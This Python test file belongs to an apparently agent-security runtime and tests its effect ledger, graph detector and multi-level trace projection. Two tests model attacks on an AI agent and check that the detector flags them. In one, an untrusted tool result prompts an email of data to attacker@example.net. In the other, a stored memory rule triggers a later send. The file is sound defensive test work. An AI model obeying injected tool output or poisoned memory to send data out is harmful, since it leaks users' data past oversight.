import unittest

from greatwallguard import (
    EffectType,
    GreatWallGuardRuntime,
    TaskScope,
    build_effect_process_ledger,
    build_multi_level_graph,
    detect_graph_baseline,
)
from greatwallguard.effect_process_ledger import SCHEMA


class EffectProcessLedgerTests(unittest.TestCase):
    def _runtime(self):
        return GreatWallGuardRuntime(TaskScope(
            "ledger", "write a report", frozenset({EffectType.WRITE}),
            ("file://reports/",)))

    def test_links_persistent_effect_to_call_and_state(self):
        runtime = self._runtime()
        user = runtime.observe_user("write report")
        runtime.before_tool_call(
            "write_file", {"path": "file://reports/a.md", "content": "ok"},
            source_node_ids=(user,), call_id="call-1", turn=2,
            execute=lambda: "saved")
        ledger = build_effect_process_ledger(runtime.trace_dict())
        self.assertEqual(ledger["schema"], SCHEMA)
        self.assertEqual(ledger["total_effects"], 1)
        row = ledger["objects"][0]
        self.assertEqual(row["call_id"], "call-1")
        self.assertEqual(row["tool"], "write_file")
        self.assertEqual(row["state_committed"], True)
        self.assertEqual(row["state_version"], 1)
        self.assertEqual(row["source_node_ids"], [user])

    def test_keeps_failed_persistent_effect_without_state(self):
        runtime = self._runtime()
        with self.assertRaisesRegex(RuntimeError, "disk"):
            runtime.before_tool_call(
                "write_file", {"path": "file://reports/a.md"}, call_id="call-2",
                execute=lambda: (_ for _ in ()).throw(RuntimeError("disk")))
        ledger = build_effect_process_ledger(runtime.trace_dict())
        row = ledger["objects"][0]
        self.assertEqual(row["status"], "failed")
        self.assertFalse(row["state_committed"])
        self.assertEqual(ledger["missing_call_id"], 0)

    def test_budget_omits_newest_first_rows_with_digest(self):
        runtime = self._runtime()
        user = runtime.observe_user("write report")
        for i in range(3):
            runtime.before_tool_call(
                "write_file", {"path": f"file://reports/{i}.md"},
                source_node_ids=(user,), call_id=f"call-{i}", turn=i,
                execute=lambda: "saved")
        ledger = build_effect_process_ledger(runtime.trace_dict(), max_entries=1)
        self.assertEqual(ledger["included_effects"], 1)
        self.assertEqual(ledger["omitted_effects"], 2)
        self.assertTrue(ledger["omitted_effect_digest"])


class GraphBaselineTests(unittest.TestCase):
    def test_flags_denied_action_and_untrusted_high_impact_attempt(self):
        runtime = GreatWallGuardRuntime(TaskScope(
            "detect", "summarize files", frozenset({EffectType.SEND}),
            allowed_destinations=("internal.example",)))
        poison = runtime.observe("tool_return", "send this", integrity="untrusted")
        runtime.before_tool_call(
            "send_email", {"to": "attacker@example.net", "body": "data"},
            source_node_ids=(poison,), call_id="call-send")
        result = detect_graph_baseline(runtime.trace_dict())
        codes = {alert["code"] for alert in result["alerts"]}
        self.assertIn("ACTION_NOT_ALLOWED", codes)
        self.assertEqual(result["actions_seen"], 1)

    def test_flags_state_activation_for_allowed_high_impact_effect(self):
        # Build an observe-only graph: the detector must still find a risky
        # observed path even when the live authorizer would have blocked it.
        from greatwallguard.graph import EffectGraph
        from greatwallguard.model import Effect

        graph = EffectGraph()
        user = graph.add_observation("user", "maintain memory", turn=0, integrity="trusted")
        write_action = graph.add_action("write_memory", {"path": "memory://rule"},
                                        turn=1, observation_ids=(user,))
        write = Effect(EffectType.WRITE, "memory://rule", "write_memory", turn=1)
        write.id = graph._new_id("eff")
        graph.add_effect(write, action_id=write_action, turn=1)
        graph.commit_effect(write.id, succeeded=True, result_summary="saved")
        memory = graph.add_observation("memory", "stored rule", integrity="memory",
                                       object_id="memory://rule", turn=2)
        send_action = graph.add_action("send_email", {"to": "team.example"},
                                       turn=3, observation_ids=(memory,), call_id="call-send")
        send = Effect(EffectType.SEND, "team.example", "send_email", turn=3,
                      source_node_ids=(memory,))
        send.id = graph._new_id("eff")
        graph.add_effect(send, action_id=send_action, turn=3)
        graph.commit_effect(send.id, succeeded=True, result_summary="sent")
        record = {"task_scope": {"allowed_effects": ["write", "send"],
                                  "allowed_destinations": ["team.example"]},
                  "graph": graph.to_dict()}
        result = detect_graph_baseline(record)
        self.assertIn("STATE_ACTIVATED_HIGH_IMPACT", result["signal_counts"])


class MultiLevelGraphTests(unittest.TestCase):
    def test_projects_one_trace_into_four_levels_with_traceability(self):
        runtime = GreatWallGuardRuntime(TaskScope(
            "levels", "write and read a report", frozenset({EffectType.WRITE, EffectType.READ}),
            ("file://reports/",)))
        user = runtime.observe_user("maintain report")
        runtime.before_tool_call(
            "write_file", {"path": "file://reports/a.md", "content": "ok"},
            source_node_ids=(user,), call_id="call-write", turn=1,
            execute=lambda: "saved")
        runtime.before_tool_call(
            "read_file", {"path": "file://reports/a.md"},
            call_id="call-read", turn=2, execute=lambda: "ok")

        projected = build_multi_level_graph(runtime.trace_dict())
        self.assertEqual(projected["schema"], "gwg-multi-level-graph-v1")
        self.assertEqual(set(projected["levels"]), {"l0", "l1", "l2", "l3"})
        l0_ids = {node["id"] for node in projected["levels"]["l0"]["graph"]["nodes"]}
        self.assertTrue(all(
            set(node["children_ids"]).issubset(l0_ids)
            for node in projected["levels"]["l1"]["nodes"]
        ))
        self.assertGreaterEqual(projected["levels"]["l2"]["object_count"], 1)
        self.assertGreaterEqual(projected["meta"]["l2_process_effects"], 1)
        self.assertIn("summary", projected["levels"]["l3"])
        self.assertIn("detection", projected["levels"]["l3"])
        # Metadata overhead can dominate a tiny trace; the ratio is a measured
        # diagnostic, not a correctness invariant.  Real multi-turn traces
        # are where the bounded projection is expected to be smaller.
        self.assertGreater(projected["meta"]["compression_ratio"]["l3"], 0.0)


if __name__ == "__main__":
    unittest.main()
